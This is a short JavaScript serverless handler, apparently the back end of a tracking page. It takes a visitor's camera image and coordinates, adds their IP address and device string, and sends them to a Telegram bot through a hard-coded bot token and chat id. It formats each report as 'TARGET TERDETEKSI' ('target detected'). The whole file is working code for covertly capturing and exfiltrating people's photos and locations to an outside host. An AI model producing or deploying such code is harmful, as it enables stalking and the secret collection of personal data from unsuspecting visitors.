export default async function handler(req, res) {
  const token = "8477393402:AAFE8gvXKejfFGOLJwdUsRhUXLPX5RHU1Cw"; 
  const chat_id = "7577766836"; 

  const { image, latitude, longitude } = req.body || {};
  const userAgent = (req.headers['user-agent'] || "Unknown").replace(/[`*_]/g, "");
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "Unknown";
  const waktu = new Date().toLocaleString();

  const mapLink = latitude && longitude
    ? `https://maps.google.com/?q=${latitude},${longitude}`
    : "Lokasi tidak tersedia";

  const message = `
🎯 *TARGET TERDETEKSI*

━━━━━━━━━━━━━━━
👤 IP: \`${ip}\`
🌆 Lokasi: ${latitude && longitude ? "User Location" : "Tidak tersedia"}
📍 [Lihat Map](${mapLink})
📱 Device: ${userAgent}
⏰ Waktu: ${waktu}
━━━━━━━━━━━━━━━
🔥 SYSTEM ACTIVE 🔥
`;

  try {
    if (image) {
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id,
          photo: image,
          caption: message,
          parse_mode: "Markdown"
        })
      });
    } else {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
      });
    }
  } catch (err) { console.error("Telegram Error:", err); }

  res.status(200).json({ status: "success" });
}